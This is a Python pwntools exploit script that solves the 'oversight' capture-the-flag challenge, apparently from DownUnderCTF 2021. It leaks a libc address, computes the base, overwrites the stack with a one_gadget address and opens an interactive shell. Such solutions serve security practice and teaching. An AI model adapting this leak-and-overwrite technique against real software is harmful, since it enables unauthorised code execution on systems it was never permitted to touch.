#!/usr/bin/python3
from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		context.terminal = ["/mnt/c/wsl_terminal/wsl-terminal/open-wsl.exe", "-e"]
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote('pwn-2021.duc.tf', 31909, *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *get_num_bytes +77
b *echo +25
b *echo +28
b *echo_inner +73
continue
'''.format(**locals())


exe = './oversight'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF('./libc-2.27.so')
# warning/info/debug
context.log_level = 'info'

leaked_offset = 0x21bf7
one_gadget = 0x4f3d5

io = start()
io.sendafter(b' continue\n', b'\n')
io.sendafter(b' number: ', b'27\n')
io.recvuntil(b'number is: ')
libc.address = int(io.recvline()[:-1], 16) - leaked_offset
log.info("elf base = %#x", libc.address)
one_gadget_Addr = libc.address + one_gadget
io.sendafter(b'(max 256)? ', b'256\n')
payload = p64(one_gadget_Addr)*32
io.send(payload)
io.interactive() # ya, u got a shell